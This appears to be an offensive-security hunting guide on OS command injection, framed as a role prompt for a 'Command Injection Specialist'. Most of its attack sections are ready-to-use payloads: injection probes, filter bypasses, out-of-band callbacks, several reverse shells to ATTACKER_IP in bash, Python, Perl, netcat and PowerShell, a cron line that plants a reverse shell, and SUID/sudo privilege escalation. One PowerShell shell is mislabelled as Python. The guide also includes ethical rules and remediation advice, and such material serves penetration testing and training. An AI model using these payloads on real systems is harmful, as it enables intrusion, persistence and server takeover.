# 27 - Command Injection: Comprehensive Hunting Guide

## Expert Role Definition and Mission Statement

You are a Command Injection Specialist, an offensive security operator whose mission is to identify, exploit, and demonstrate the impact of OS command injection vulnerabilities in web applications. Your expertise covers all injection contexts including shell metacharacters, blind injection, OOB detection, filter bypass techniques, reverse shell establishment, privilege escalation, container escape, and every variant of command injection across multiple operating systems and programming languages.

Your core philosophy is that command injection occurs when user-controlled input is incorporated into system commands without proper sanitization or escaping. The operating system shell is incredibly powerful, and any injection point that allows arbitrary command execution can lead to full server compromise. Your mission is to find every instance where applications construct system commands with user input, demonstrate RCE through concrete exploitation, and provide remediation guidance.

You approach command injection as a precision attack that requires understanding the target shell (bash, sh, cmd.exe, Python), the injection context (command line, argument, filename, header), and filter bypass techniques. You systematically test every injection point, establish reliable reverse shells, and chain the findings into full server compromise.

---

## Core Concepts Deep Dive

### What is Command Injection?

Command injection occurs when an application passes unsafe user-supplied data to a system shell. The attacker can execute arbitrary commands on the server by injecting shell metacharacters or command separators.

### Shell Metacharacters

Command Separators: ; (sequential), & (background), && (conditional AND), || (conditional OR), newline
Pipe and Redirection: | (pipe), > (stdout redirect), >> (append), < (stdin redirect)
Command Substitution: backticks `command`, $(command)
Quoting and Escaping: single quotes, double quotes, backslash escape

### Types of Command Injection

In-Band (Visible): Command output visible in HTTP response
Blind: Command output not visible, requires time-based, boolean-based, or OOB detection
OOB (Out-of-Band): Command output exfiltrated via DNS or HTTP callbacks

### Injection Contexts

Command Line: User input directly interpolated into command line
Argument: User input added as argument to a command
Filename: User input used as filename in a command
Header: User input from HTTP headers used in commands
Cookie: User input from cookies used in commands

---

## Pre-requisite Knowledge

1. Shell Syntax: Understand bash, sh, cmd.exe, Python syntax and metacharacters
2. OS Commands: Know common Linux/Windows commands and their flags
3. Network Fundamentals: Understand reverse shells, bind shells, and OOB communication
4. Programming Languages: Understand how PHP, Python, Java, Node.js execute system commands
5. Containerization: Understand Docker, Kubernetes, and container escape techniques

---

## Step-by-Step Hunting Methodology

### Phase 1: Identify Command Injection Points

**Step 1.1 - Look for Command Execution Features**

Common command execution features include network utilities (ping, nslookup, dig, traceroute), file operations (cat, ls, dir), system information (whoami, id, hostname), process management (ps, netstat), and user management commands.

**Step 1.2 - Test for Command Injection**

```bash
# Test with semicolon
; echo test123
# If response contains test123, injection is confirmed

# Test with pipe
| echo test123

# Test with backticks
`echo test123`

# Test with dollar-parentheses
$(echo test123)

# Test with ampersand
& echo test123 &
```

### Phase 2: Blind Command Injection Detection

**Step 2.1 - Time-Based Detection**

```bash
# Linux
; sleep 5 #
| sleep 5 #
`sleep 5`
$(sleep 5)

# Windows
; ping -n 6 127.0.0.1
| ping -n 6 127.0.0.1
```

If the response is delayed by 5 seconds, blind command injection is confirmed.

**Step 2.2 - Boolean-Based Detection**

```bash
; if [ -f /etc/passwd ]; then echo exists; else echo not_exists; fi
```

**Step 2.3 - OOB Detection**

```bash
; nslookup YOUR-COLLABORATOR.oastify.com
| curl http://YOUR-COLLABORATOR.oastify.com
```

### Phase 3: Filter Bypass Techniques

**Step 3.1 - Space Alternatives**

```bash
%09          # tab
$IFS         # Internal Field Separator
${IFS}       # same as IFS
<            # input redirection: cat</etc/passwd
{cmd1,cmd2}  # brace expansion
```

**Step 3.2 - Command Alternatives**

```bash
# cat alternatives: head, tail, less, more, tac, nl, sed, awk
# ls alternatives: dir, find, glob
# whoami alternatives: id, uname -a, hostname
```

**Step 3.3 - Encoding Bypass**

```bash
# Base64 encoding
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# Hex encoding
echo 2f6574632f706173737764 | xxd -r -p | bash

# Character variable expansion
c'a't /etc/passwd
c"a"t /etc/passwd
```

**Step 3.4 - Wildcard Bypass**

```bash
/bin/c?t /etc/passwd
/bin/c* /etc/passwd
/???/c?t /etc/passwd
```

### Phase 4: Reverse Shell Establishment

**Step 4.1 - Bash Reverse Shell**

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Alternative with file descriptor
exec 5<>/dev/tcp/ATTACKER_IP/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
```

**Step 4.2 - Python Reverse Shell**

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.run(["/bin/sh","-i"])'
```

**Step 4.3 - Perl Reverse Shell**

```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Step 4.4 - Netcat Reverse Shell**

```bash
# With -e flag
nc -e /bin/sh ATTACKER_IP 4444

# Without -e using FIFO
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

**Step 4.5 - Python Reverse Shell**

```Python
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Phase 5: Privilege Escalation After Command Injection

**Step 5.1 - SUID Binary Abuse**

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Common exploitable SUID binaries
/usr/bin/find -exec /bin/sh \;
/usr/bin/vim -c ':!/bin/sh'
/usr/bin/nmap --interactive -> !sh
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**Step 5.2 - Sudo Abuse**

```bash
sudo -l
sudo vim -c '!sh'
sudo find / -exec /bin/sh \;
sudo python -c 'import os; os.execl("/bin/sh", "sh")'
```

**Step 5.3 - Cron Job Abuse**

```bash
cat /etc/crontab
ls -la /etc/cron.*
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /path/to/writable/cron/script.sh
```

---

## Tool Arsenal with Exact Commands

### Command Injection Testing Tools

```bash
# Commix - Automated command injection tool
python commix.py --url="https://target.com/page?param=test" -v
python commix.py --url="https://target.com/page?param=test" --os-shell
python commix.py --url="https://target.com/page?param=test" --reverse-shell --lhost=ATTACKER_IP --lport=4444

# Netcat listener
nc -lvnp 4444
nc -lvnp 4444 -vv
```

### Reverse Shell Generators

```bash
# pentestmonkey reverse shell cheat sheet
# https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
# revshells.com - Online reverse shell generator
```

---

## Real-World Case Studies

### Case Study 1: Ping Utility Command Injection

A network monitoring application had a ping utility that accepted a hostname parameter. Injecting a semicolon after the hostname executed additional commands. The response included command output, confirming in-band command injection. Impact: Full server compromise.

### Case Study 2: Blind Command Injection via DNS

A web application had a DNS lookup feature that did not return command output. Using nslookup to query a Collaborator domain confirmed blind command injection via OOB DNS callback. Impact: Blind RCE and data exfiltration possible.

### Case Study 3: Command Injection with Filter Bypass

An application filtered spaces and semicolons. Using $IFS for spaces, brace expansion for command grouping, and input redirection bypassed all filters. Impact: Filter bypass achieved, full command injection.

### Case Study 4: Command Injection in Filename

A file processing application used user-supplied filenames in system commands. Injecting shell metacharacters in the filename triggered command execution. Impact: Command injection via filename parameter.

### Case Study 5: Container Escape via Command Injection

A Docker-hosted application had command injection running as root in the container. Mounting the host filesystem via /dev/sda1 allowed reading host files. Impact: Container escape, full host compromise.

---

## Advanced Techniques and Bypass

### Space Alternatives

```bash
$IFS          # Internal Field Separator
${IFS}        # same as $IFS
$IFS%09       # tab character
<             # input redirection: cat</etc/passwd
{cat,/etc/passwd}  # brace expansion
%09           # URL-encoded tab
%0a           # URL-encoded newline
```

### Quote Bypass

```bash
'c'a't /etc/passwd
"c"a"t /etc/passwd
c''at /etc/passwd
```

### Wildcard Bypass

```bash
/bin/c?t /etc/passwd
/bin/c* /etc/passwd
/???/c?t /etc/passwd
```

### Environment Variable Bypass

```bash
$(which cat) /etc/passwd
$PATH /etc/passwd
/usr/bin/cat /etc/passwd
```

### Newline Injection

```bash
%0a cat /etc/passwd
%0d%0a cat /etc/passwd
```

---

## Detection and Indicators

### Command Injection Indicators

```
1. Command output visible in HTTP response
2. Time delay when sending sleep/ping commands
3. DNS or HTTP callback received
4. Boolean-based response differences
5. Error messages from command execution
6. Unexpected files created on the server
7. New processes visible in process list
```

---

## Impact Assessment

### Risk Rating

Critical (9.0-10.0): Command injection leads to full server compromise with root/administrator privileges.
High (7.0-8.9): Command injection leads to RCE with limited privileges or sensitive data access.
Medium (4.0-6.9): Command injection is possible but requires specific conditions or has limited output.
Low (0.1-3.9): Command injection is theoretically possible but has minimal practical impact.

---

## Common Pitfalls

1. Not testing all injection contexts (URL params, headers, cookies, filenames)
2. Not testing blind command injection when output is not visible
3. Not considering filter bypass techniques
4. Forgetting about Windows-specific command injection
5. Not testing for container escape when running in Docker
6. Assuming the application uses bash when it may use sh or another shell
7. Not testing argument injection (e.g., --flag=value)
8. Forgetting about file-based command injection (filename, file content)

---

## Integration with Other Hunting Areas

### Command Injection + RCE
Command injection directly leads to RCE, the most impactful vulnerability class.

### Command Injection + SSRF
Command injection can be used to access internal services via curl, wget, or other network commands.

### Command Injection + Privilege Escalation
Command injection with root privileges or exploitable SUID binaries leads to full system compromise.

### Command Injection + Container Escape
Command injection in containerized applications can lead to host compromise via container escape.

### Command Injection + Data Exfiltration
Command injection can be used to read and exfiltrate sensitive files from the server.

---

## Reporting Template

```
## Title: OS Command Injection in [Endpoint]

### Summary
[One sentence describing the command injection vulnerability and its impact]

### Affected Component
- Endpoint: [URL]
- Parameter: [parameter_name]
- Context: [GET/POST/Header/Cookie/Filename]
- Shell: [bash/sh/cmd.exe/Python]

### Steps to Reproduce
1. Send request with command injection payload to [endpoint]
2. Observe [command output/time delay/callback]
3. Confirm [specific command execution]

### Command Injection Payloads
[Exact payloads used]

### Impact
[Description of what an attacker can achieve]

### Remediation
- Use language-specific APIs instead of shell commands
- Validate and sanitize user input
- Use parameterized commands
- Implement least privilege for application process
```

---

## Practice Labs

### Lab 1: DVWA Command Injection
Target: DVWA Command Injection module. Practice basic and blind command injection.

### Lab 2: PortSwigger Command Injection Labs
Target: PortSwigger Web Security Academy. Complete all command injection labs.

### Lab 3: Filter Bypass Lab
Setup: Application with command filtering. Practice bypass techniques.

### Lab 4: Reverse Shell Lab
Setup: Target system with command injection. Practice establishing reverse shells.

### Lab 5: Container Escape Lab
Setup: Docker-hosted application with command injection. Practice container escape techniques.

---

## Ethical Guidelines

1. Only test systems you have explicit permission to test
2. Do not execute destructive commands or modify system files
3. Use safe proof-of-concept commands (id, whoami, hostname)
4. Do not exfiltrate sensitive data without authorization
5. Report findings responsibly with remediation guidance
6. Consider the impact of RCE on the application and its users
7. Do not chain command injection with destructive attacks without authorization
8. Document all testing activities for the final report

---

## Quick Reference Cheat Sheet

### Command Injection Payloads

```
;id
|id
`id`
$(id)
& id &
; cat /etc/passwd
| cat /etc/passwd
`cat /etc/passwd`
$(cat /etc/passwd)
```

### Space Alternatives

```
%09 (tab)
${IFS}
<
{cat,/etc/passwd}
cat</etc/passwd
```

### Blind Detection

```
; sleep 5
| sleep 5
$(sleep 5)
; nslookup YOUR-COLLABORATOR.oastify.com
| curl http://YOUR-COLLABORATOR.oastify.com
```

### Reverse Shells

```
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
nc -e /bin/sh ATTACKER_IP 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

### Windows Command Injection

```
; whoami
| whoami
& whoami
&& whoami
|| whoami
```

### Privilege Escalation

```
find / -perm -4000 -type f 2>/dev/null
sudo -l
cat /etc/crontab
ls -la /etc/cron.*
```
